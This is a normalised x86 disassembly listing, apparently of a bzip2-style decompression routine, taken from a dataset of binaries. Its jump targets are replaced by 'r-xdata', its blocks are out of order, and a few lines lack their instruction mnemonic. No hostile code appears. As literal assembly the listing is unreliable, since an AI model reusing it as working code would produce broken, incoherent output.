mov ecx [ ebp - 0x1c ]
shl eax 0x4
add eax ebx
mov [ eax + ecx + 0xc6c ] 0x1
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp eax 0x6
jg r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
and [ ebp - 0x10 ] 0x0
jmp r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
inc [ ebp - 0x1c ]
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x3c ]
jl r-xdata
mov ecx [ ebp - 0x10 ]
mov al [ ebp - 0x1c ]
inc [ ebp - 0x10 ]
mov [ ebx + ecx + 0x650e ] al
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
dec [ ebp - 0x34 ]
inc [ ebp - 0x34 ]
jmp r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x40 ]
mov edx [ ebp - 0x10 ]
imul eax eax 0x102
mov cl [ ebp - 0x34 ]
add eax ebx
inc [ ebp - 0x10 ]
mov [ eax + edx + 0xab60 ] cl
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x60 ]
jl r-xdata
mov esi [ eax ]
movzx esi [ esi ]
mov edx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl edx 0x8
or edx esi
mov [ ebx + 0x1c ] edx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp esi 0x14
mov [ ebx + 0x20 ] edx
jg r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x58 ]
mov eax [ ebp - 0x2c ]
cmp eax [ ecx + esi * 4 ]
jle r-xdata
mov esi [ eax ]
movzx esi [ esi ]
mov edx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl edx 0x8
or edx esi
mov [ ebx + 0x1c ] edx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x58 ]
cmp eax [ ecx + esi * 4 ]
jle r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp esi 0x14
mov [ ebp - 0x2c ] eax
mov [ ebx + 0x20 ] edx
jg r-xdata
mov esi [ eax ]
movzx esi [ esi ]
mov edx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl edx 0x8
or edx esi
mov [ ebx + 0x1c ] edx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x14
mov [ ebp - 0x2c ] eax
mov [ ebx + 0x20 ] edx
jg r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x58 ]
shl ecx 0x2
cmp eax [ ecx + edx ]
jg r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
and [ ebx + 0xc5c ] 0x0
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop eax
jmp r-xdata
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
add eax 0xffffffd0
cmp [ ebx + 0x28 ] 0x0
mov [ ebx + 0x24 ] eax
push 0x1
je r-xdata
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
and [ ebp - 0x10 ] 0x0
jmp r-xdata
inc [ eax + 0xc ]
mov eax [ ebp - 0x10 ]
cmp eax 0x10
jge r-xdata
inc [ eax + 0xc ]
inc [ ebp - 0x10 ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
mov edx [ ebp - 0x54 ]
cmp [ ebp - 0x10 ] edx
jge r-xdata
inc [ eax + 0xc ]
jmp r-xdata
xor edi edi
xor cl cl
cmp [ ebp - 0x3c ] edi
jle r-xdata
and [ ebp - 0x1c ] 0x0
inc [ eax + 0xc ]
cmp [ ebp - 0x34 ] 0x14
jg r-xdata
cmp [ ebp - 0x34 ] 0x1
jl r-xdata
inc [ eax + 0xc ]
inc [ ebp - 0x40 ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
mov ecx [ ebp - 0x44 ]
sub eax [ ecx + esi * 4 ]
inc esi
mov [ ebp - 0x14 ] esi
inc [ eax + 0xc ]
mov ecx [ ebp - 0x44 ]
sub eax [ ecx + esi * 4 ]
js r-xdata
inc esi
mov [ ebp - 0x14 ] esi
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ ebp - 0x14 ]
mov edx [ ebp - 0x44 ]
sub eax [ ecx + edx ]
jmp r-xdata
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
imul eax eax 0x61a80
push eax
push [ esi + 0x2c ]
call [ esi + 0x24 ]
add esp 0xc
mov [ ebx + 0xc4c ] eax
jmp r-xdata
imul eax eax 0x30d40
push eax
push [ esi + 0x2c ]
call [ esi + 0x24 ]
mov [ ebx + 0xc50 ] eax
mov eax [ ebx + 0x24 ]
imul eax eax 0x186a0
inc eax
push 0x1
sar eax 0x1
push eax
push [ esi + 0x2c ]
call [ esi + 0x24 ]
add esp 0x18
cmp [ ebx + 0xc50 ] 0x0
mov [ ebx + 0xc54 ] eax
je r-xdata
cmp [ ebp - 0x10 ] 0x10
jl r-xdata
mov eax ebx
call sub_1000965f
mov eax [ ebx + 0xc68 ]
test eax eax
je r-xdata
cmp [ ebx + eax + 0xd6c ] 0x0
je r-xdata
cmp edx edi
mov [ ebp - 0x10 ] edi
jle r-xdata
xor eax eax
and [ ebp - 0x40 ] 0x0
cmp [ ebp - 0x3c ] 0x0
jle r-xdata
cmp eax 0x102
jge r-xdata
cmp eax 0x102
jge r-xdata
js r-xdata
test eax eax
jne r-xdata
push 0xfffffffd
add eax 0x2
mov [ ebp - 0x60 ] eax
and [ ebp - 0x1c ] 0x0
jmp r-xdata
and [ ebp - 0x40 ] 0x0
jmp r-xdata
mov dl [ ebx + edi + 0x650e ]
movzx eax dl
lea eax [ ebp + eax - 0xc ]
mov cl [ eax ]
test dl dl
jbe r-xdata
mov [ ebp + eax - 0xc ] cl
inc cl
movzx eax cl
cmp eax [ ebp - 0x3c ]
jl r-xdata
mov eax [ ebx + 0xc68 ]
and [ ebp - 0x28 ] 0x0
inc eax
mov [ ebp - 0x64 ] eax
mov eax [ ebx + 0x24 ]
imul eax eax 0x186a0
mov edx 0x100
mov [ ebp - 0x30 ] eax
xor eax eax
lea edi [ ebx + 0x40 ]
mov ecx edx
[ edi ]
push 0xf
mov [ ebp - 0x10 ] edx
mov esi 0xfff
pop eax
lea edi [ ebx + 0x1eb8 ]
lea eax [ ebx + 0xab60 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x3c ]
lea esi [ ebx + 0xf9fc ]
lea edi [ ebx + 0xc99c ]
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x40 ] eax
mov ecx [ ebp - 0x50 ]
mov eax [ ecx + eax * 4 ]
mov [ ebp - 0x48 ] eax
mov ecx [ ebp - 0x50 ]
mov eax [ ecx + eax * 4 ]
xor edx edx
mov [ ebp - 0x48 ] eax
cmp eax edx
je r-xdata
cmp [ ebp - 0x1c ] 0x10
jl r-xdata
mov eax [ ebp - 0x40 ]
cmp eax [ ebp - 0x3c ]
jge r-xdata
mov [ ebx + edi + 0x1ebc ] cl
inc edi
cmp edi [ ebp - 0x54 ]
mov [ ebp - 0xc ] cl
jl r-xdata
mov esi eax
mov dl [ ebp - 0x24 ]
add dl cl
mov [ ebx + esi + 0xe7c ] dl
dec esi
dec [ ebp - 0x24 ]
jns r-xdata
lea ecx [ esi + 0x1 ]
mov [ edi ] ecx
dec eax
sub edi 0x4
test eax eax
jge r-xdata
push [ ebp - 0x60 ]
lea eax [ edi + 0x1830 ]
push edx
push [ ebp - 0x30 ]
push [ ebp - 0x24 ]
push eax
lea eax [ edi - 0x1830 ]
push edi
push eax
call sub_1000b856
mov eax [ ebp - 0x30 ]
add [ ebp - 0x24 ] 0x102
mov [ esi ] eax
add esp 0x1c
add esi 0x4
add edi 0x408
dec [ ebp - 0x64 ]
jne r-xdata
mov eax [ ebp - 0x24 ]
movzx eax [ eax + ecx ]
cmp eax edx
jle r-xdata
mov eax [ ebx + 0x34 ]
test eax eax
jl r-xdata
test edi edi
je r-xdata
mov eax [ ebp - 0x70 ]
cmp eax 0x200000
jge r-xdata
cmp eax 0x1
je r-xdata
mov [ ebp - 0x10 ] edi
mov al [ esi - 0x1 ]
dec dl
mov [ esi ] al
dec esi
test dl dl
ja r-xdata
mov cl al
mov [ ebp - 0x24 ] 0xf
shl cl 0x4
xor eax eax
cmp [ ebp - 0x54 ] eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x24 ] eax
jle r-xdata
xor edx edx
xor ecx ecx
cmp [ ebp - 0x60 ] edx
mov [ ebp - 0x30 ] 0x20
jle r-xdata
cmp eax [ ebp - 0x30 ]
jge r-xdata
mov edx eax
cmp eax [ ebp - 0x18 ]
jge r-xdata
or [ ebp - 0x20 ] 0xffffffff
mov [ ebp - 0x70 ] 0x1
cmp edi 0x1
jne r-xdata
cmp [ ebp - 0x48 ] 0x0
jne r-xdata
mov eax [ ebx + 0x1e7c ]
movzx eax [ eax + ebx + 0xe7c ]
mov cl [ eax + ebx + 0xd7c ]
inc [ ebp - 0x20 ]
mov esi [ ebp - 0x20 ]
movzx eax cl
add [ ebx + eax * 4 + 0x40 ] esi
cmp [ ebx + 0x28 ] dl
je r-xdata
movzx eax [ ebx + 0x1ebc ]
mov ecx [ ebx + eax * 4 + 0xf9fc ]
mov [ ebp - 0x6c ] eax
imul eax eax 0x408
add eax ebx
lea edx [ eax + 0xb16c ]
mov [ ebp - 0x58 ] edx
lea edx [ eax + 0xe1cc ]
add eax 0xc99c
mov [ ebp - 0x5c ] ecx
mov [ ebp - 0x50 ] edx
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x28 ] 0x31
mov [ ebp - 0x14 ] ecx
inc ecx
cmp ecx [ ebp - 0x60 ]
jl r-xdata
mov [ ebp - 0x30 ] eax
and [ ebp - 0x10 ] 0x0
lea esi [ ebx + 0x40 ]
mov eax esi
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x30 ]
jge r-xdata
cmp [ ebp - 0x48 ] 0x1
jne r-xdata
add [ ebp - 0x20 ] eax
jmp r-xdata
cmp [ ebp - 0x20 ] edx
jle r-xdata
cmp esi edx
jle r-xdata
cmp ecx [ ebp - 0x18 ]
jg r-xdata
dec edi
cmp edi 0x10
jae r-xdata
add eax eax
cmp [ ebp - 0x28 ] 0x0
mov [ ebp - 0x70 ] eax
jne r-xdata
mov ecx [ ebp - 0x20 ]
lea ecx [ ecx + eax * 2 ]
mov [ ebp - 0x20 ] ecx
mov edi [ ebp - 0x48 ]
cmp edi [ ebp - 0x64 ]
je r-xdata
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
inc [ ebp - 0x10 ]
add eax 0x4
cmp [ ebp - 0x10 ] 0xff
jle r-xdata
mov esi edi
shr esi 0x4
lea eax [ ebx + esi * 4 + 0x1e7c ]
mov edx [ eax ]
and edi 0xf
add edi edx
cmp edi edx
mov cl [ ebx + edi + 0xe7c ]
jle r-xdata
mov edx [ ebx + 0x1e7c ]
lea eax [ ebx + edx ]
mov cl [ eax + edi + 0xe7c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x49 ] cl
cmp edi 0x3
jbe r-xdata
mov eax [ ebp - 0x5c ]
dec [ ebp - 0x28 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x24 ]
inc eax
cmp eax [ ebp - 0x54 ]
mov [ ebp - 0x24 ] eax
jge r-xdata
mov esi [ ebx + 0xc4c ]
mov [ esi + ecx * 4 ] eax
inc ecx
dec [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] edx
mov [ ebp - 0x18 ] ecx
jg r-xdata
mov edi [ ebx + 0xc50 ]
movzx si cl
mov [ edi + eax * 2 ] si
inc eax
dec [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] edx
mov [ ebp - 0x18 ] eax
jg r-xdata
mov ecx [ eax ]
test ecx ecx
jl r-xdata
and [ ebx + 0x444 ] 0x0
mov edx 0x100
lea eax [ ebx + 0x448 ]
mov ecx edx
mov edi eax
[ edi ] [ esi ]
mov ecx edx
inc [ eax ]
test esi esi
jle r-xdata
lea edx [ ebx + 0xe7c ]
test edi edi
jbe r-xdata
lea ecx [ ebx + 0xe7b ]
lea eax [ ecx + edx ]
mov edx ebx
sub edx ecx
add edx 0xe7c
mov [ ebp - 0x68 ] edx
mov edx ebx
sub edx ecx
add edx 0xe7a
mov [ ebp - 0x7c ] edx
mov edx ebx
sub edx ecx
add edx 0xe78
mov [ ebp - 0x78 ] edx
mov edx ebx
sub edx ecx
lea esi [ edi - 0x4 ]
add edx 0xe79
shr esi 0x2
add eax edi
mov [ ebp - 0x38 ] edx
inc esi
movzx eax [ ebx + eax + 0x1ebc ]
mov ecx [ ebx + eax * 4 + 0xf9fc ]
mov [ ebp - 0x6c ] eax
imul eax eax 0x408
add eax ebx
mov [ ebp - 0x5c ] ecx
lea ecx [ eax + 0xb16c ]
mov [ ebp - 0x58 ] ecx
lea ecx [ eax + 0xe1cc ]
add eax 0xc99c
mov [ ebp - 0x28 ] 0x32
mov [ ebp - 0x50 ] ecx
mov [ ebp - 0x44 ] eax
cmp ecx [ ebp - 0x30 ]
jge r-xdata
jmp r-xdata
cmp eax [ ebp - 0x30 ]
jge r-xdata
jmp r-xdata
mov esi [ eax - 0x4 ]
add [ eax ] esi
add eax 0x4
dec ecx
jne r-xdata
xor esi esi
mov [ ebp - 0x10 ] esi
lea ecx [ ebx + 0x444 ]
lea eax [ ebx + 0x1e7c ]
dec [ eax ]
mov edx [ eax ]
mov [ ebx + edx + 0xe7c ] cl
cmp [ eax ] 0x0
jne r-xdata
mov edi eax
mov al [ edx + edi - 0x1 ]
mov [ edx + edi ] al
dec edi
lea eax [ ebx + esi * 4 + 0x1e7c ]
cmp edi [ eax ]
jg r-xdata
mov [ eax + 0xe7c ] cl
jmp r-xdata
lea esi [ eax + 0xe7c ]
mov cl [ eax ]
mov edx [ ebp - 0x68 ]
mov [ edx + eax ] cl
mov ecx [ ebp - 0x7c ]
add ecx eax
mov dl [ ecx ]
mov [ eax ] dl
mov edx [ ebp - 0x38 ]
mov dl [ edx + eax ]
mov [ ecx ] dl
mov ecx [ ebp - 0x78 ]
mov cl [ ecx + eax ]
mov edx [ ebp - 0x38 ]
mov [ edx + eax ] cl
sub edi 0x4
sub eax 0x4
dec esi
jne r-xdata
mov eax [ ebp - 0xc ]
mov cl [ ebp - 0x49 ]
cmp eax [ ebp - 0x18 ]
jg r-xdata
mov edx [ ebp - 0x18 ]
movzx eax cl
lea eax [ eax + ebx + 0xd7c ]
movzx ecx [ eax ]
lea ecx [ ebx + ecx * 4 + 0x40 ]
inc [ ecx ]
cmp [ ebx + 0x28 ] 0x0
je r-xdata
mov edi 0xfff
mov [ ebp - 0x38 ] 0xf
lea esi [ ebx + 0x1eb8 ]
dec [ edi ]
mov edx [ edi - 0x4 ]
mov eax [ edi ]
mov dl [ edx + ebx + 0xe8b ]
dec esi
sub edi 0x4
mov [ ebx + eax + 0xe7c ] dl
test esi esi
jg r-xdata
mov dl [ esi + edi - 0x1 ]
mov [ esi + edi ] dl
dec edi
jne r-xdata
inc [ ebp - 0x10 ]
add ecx 0x4
cmp [ ebp - 0x10 ] edx
jle r-xdata
movzx eax [ eax ]
mov ecx [ ebx + 0xc4c ]
mov [ ecx + edx * 4 ] eax
movzx ax [ eax ]
mov ecx [ ebx + 0xc50 ]
mov [ ecx + edx * 2 ] ax
jmp r-xdata
mov eax [ ebp - 0x68 ]
mov edx [ esi ]
add eax ebx
mov al [ eax + edx + 0xe7c ]
mov [ edi + ebx + 0xe7c ] al
dec edi
dec [ ebp - 0x68 ]
jns r-xdata
dec [ ebp - 0x38 ]
lea eax [ edi + 0x1 ]
mov [ esi ] eax
sub esi 0x4
cmp [ ebp - 0x38 ] 0x0
jge r-xdata
mov eax [ ecx ]
cmp eax esi
jl r-xdata
xor eax eax
inc eax
mov [ ebp - 0x10 ] eax
lea ecx [ ebx + 0x444 ]
mov eax [ ebp - 0x5c ]
dec [ ebp - 0x28 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x24 ]
inc eax
cmp eax [ ebp - 0x54 ]
mov [ ebp - 0x24 ] eax
jge r-xdata
inc [ ebp - 0x18 ]
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov [ ebp - 0x68 ] 0xf
inc [ ebp - 0x10 ]
add ecx 0x4
cmp [ ebp - 0x10 ] edx
jle r-xdata
movzx eax [ ebx + eax + 0x1ebc ]
mov ecx [ ebx + eax * 4 + 0xf9fc ]
mov [ ebp - 0x6c ] eax
imul eax eax 0x408
add eax ebx
mov [ ebp - 0x5c ] ecx
lea ecx [ eax + 0xb16c ]
mov [ ebp - 0x58 ] ecx
lea ecx [ eax + 0xe1cc ]
add eax 0xc99c
mov [ ebp - 0x28 ] 0x32
mov [ ebp - 0x50 ] ecx
mov [ ebp - 0x44 ] eax
mov edi [ ecx ]
cmp edi [ ecx + 0x4 ]
jg r-xdata
or [ ebx + 0xc60 ] 0xffffffff
cmp [ ebx + 0x28 ] 0x0
mov [ ebx + 0xc ] esi
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0x4 ] 0x2
je r-xdata
cmp [ ebp - 0x18 ] esi
mov [ ebp - 0x10 ] esi
jle r-xdata
xor edx edx
cmp [ ebp - 0x18 ] edx
lea edi [ ebx + 0x848 ]
mov ecx 0x101
lea esi [ ebx + 0x444 ]
[ edi ] [ esi ]
jle r-xdata
mov ecx [ ebx + 0xc4c ]
mov edx [ ebx + 0x34 ]
mov edx [ ecx + edx * 4 ]
shr edx 0x8
cmp [ ebx + 0x10 ] 0x0
mov [ ebx + 0x38 ] edx
mov [ ebx + 0x440 ] esi
je r-xdata
mov edx [ ebx + 0xc4c ]
movzx ecx [ edx + esi * 4 ]
lea ecx [ ebx + ecx * 4 + 0x444 ]
mov edi [ ecx ]
lea edx [ edx + edi * 4 ]
mov edi esi
shl edi 0x8
or [ edx ] edi
inc [ ecx ]
inc esi
cmp esi [ ebp - 0x18 ]
jl r-xdata
mov edx [ ebx + 0x34 ]
mov esi [ ebx + 0xc54 ]
mov ecx edx
sar ecx 0x1
movzx edi [ ecx + esi ]
movzx ecx dl
and cl 0x1
shl cl 0x2
shr edi cl
mov ecx [ ebx + 0xc50 ]
movzx ecx [ ecx + edx * 2 ]
and edi 0xf
shl edi 0x10
or edi ecx
jmp r-xdata
mov ecx [ ebx + 0xc50 ]
lea ecx [ ecx + edx * 2 ]
movzx esi [ ecx ]
lea esi [ ebx + esi * 4 + 0x848 ]
mov di [ esi ]
mov [ ecx ] di
test dl 0x1
jne r-xdata
mov esi [ ebx + 0x24 ]
imul esi esi 0x186a0
cmp edx esi
jae r-xdata
mov [ ebx + 0x14 ] esi
mov [ ebx + 0x18 ] esi
mov esi [ ebx + 0x24 ]
imul esi esi 0x186a0
cmp edx esi
jae r-xdata
mov [ ebp - 0x10 ] esi
xor esi esi
mov esi [ ebx + 0xc54 ]
mov ecx edi
sar ecx 0x1
movzx esi [ esi + ecx ]
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x1c ] edi
and [ ebp - 0x1c ] eax
movzx ecx [ ebp - 0x1c ]
mov eax [ ebx + 0xc50 ]
shl cl 0x2
shr esi cl
lea eax [ eax + edi * 2 ]
movzx ecx [ eax ]
and esi 0xf
shl esi 0x10
or esi ecx
mov ecx [ ebp - 0x38 ]
mov [ eax ] dx
mov eax [ ebx + 0xc54 ]
add eax ecx
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
mov ecx [ ebx + 0xc54 ]
mov eax edx
sar eax 0x1
lea edi [ eax + ecx ]
mov eax [ esi ]
mov ecx [ esi ]
sar eax 0xc
xor al [ edi ]
sar ecx 0xc
and al 0xf
xor al cl
mov [ edi ] al
xor eax eax
inc eax
mov edi [ ebx + 0xc54 ]
mov ecx edx
sar ecx 0x1
add edi ecx
mov cl [ edi ]
and cl 0xf0
or cl [ esi + 0x2 ]
mov [ edi ] cl
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000fe6e
leave
retn
mov ecx [ ecx + edx * 4 ]
mov [ ebx + 0x38 ] ecx
shr [ ebx + 0x38 ] 0x8
movzx ecx cl
mov [ ebx + 0x440 ] eax
mov ecx [ ecx + edx * 4 ]
mov [ ebx + 0x38 ] ecx
shr [ ebx + 0x38 ] 0x8
movzx ecx cl
mov [ ebx + 0x3c ] ecx
mov [ ebx + 0x440 ] eax
mov ecx [ rw-data ]
mov [ ebx + 0x14 ] ecx
dec [ ebx + 0x14 ]
mov ecx [ ebx + 0x14 ]
xor edx edx
cmp ecx eax
sete dl
mov [ ebx + 0x18 ] eax
xor [ ebx + 0x3c ] edx
jmp r-xdata
mov ecx edx
sar ecx 0xc
xor cl [ eax ]
sar edx 0xc
and cl 0xf
xor cl dl
mov [ eax ] cl
mov cl [ eax ]
sar edx 0x10
and cl 0xf0
or dl cl
mov [ eax ] dl
jmp r-xdata
inc [ esi ]
inc edx
cmp edx [ ebp - 0x18 ]
jl r-xdata
xor eax eax
inc eax
mov eax [ ebx + 0x34 ]
xor ecx ecx
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x10 ] edx
mov [ ebx + 0x38 ] eax
mov [ ebx + 0x440 ] ecx
cmp [ ebx + 0x10 ] cl
je r-xdata
mov edx edi
mov edi esi
cmp edx [ ebx + 0x34 ]
jne r-xdata
mov ecx [ ebx + 0x24 ]
imul ecx ecx 0x186a0
cmp eax ecx
jae r-xdata
mov [ ebx + 0x14 ] ecx
mov [ ebx + 0x18 ] ecx
mov ecx [ ebx + 0x24 ]
imul ecx ecx 0x186a0
cmp eax ecx
jb r-xdata
xor eax eax
inc eax
jmp r-xdata
lea ecx [ ebx + 0x444 ]
push ecx
push eax
call sub_100072fb
mov edx [ ebx + 0xc54 ]
mov [ ebx + 0x3c ] eax
mov eax [ ebx + 0x38 ]
pop ecx
pop ecx
mov ecx eax
shr ecx 0x1
movzx edx [ ecx + edx ]
